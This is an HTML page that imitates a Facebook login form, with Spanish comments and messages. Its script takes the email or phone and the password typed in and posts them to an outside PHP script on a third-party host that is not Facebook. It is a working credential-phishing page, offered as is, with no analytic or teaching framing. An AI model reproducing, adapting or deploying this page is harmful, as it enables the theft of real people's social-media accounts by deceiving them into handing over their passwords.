<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        /* TUS ESTILOS ORIGINALES */
    
        /* ... (conserva todos tus estilos originales) ... */
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Facebook</h1>
            <form id="loginForm">
                <input type="text" id="user" placeholder="Email or Phone" required>
                <input type="password" id="pass" placeholder="Password" required>
                <button type="button" onclick="enviarDatos()">Log In</button>
                <a href="#">Forgotten password?</a>
                <div class="divider"></div>
                <button type="button" class="create-account">Create New Account</button>
            </form>
            <div id="responseMessage"></div>
        </div>
    </div>

    <script>
        async function enviarDatos() {
            const user = document.getElementById("user").value;
            const pass = document.getElementById("pass").value;
            const responseDiv = document.getElementById("responseMessage");

            if (!user || !pass) {
                responseDiv.textContent = "Complete todos los campos";
                responseDiv.style.display = "block";
                return;
            }

            try {
                // Usamos Fetch API para enviar a un script PHP
                const response = await fetch('http://chicaslindas.mywebcommunity.org/script.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`
                });
                
                const result = await response.text();
                responseDiv.textContent = result;
                responseDiv.style.display = "block";
            } catch (error) {
                responseDiv.textContent = "Error de conexi√≥n";
                responseDiv.style.display = "block";
            }
        }
    </script>
</body>
</html>
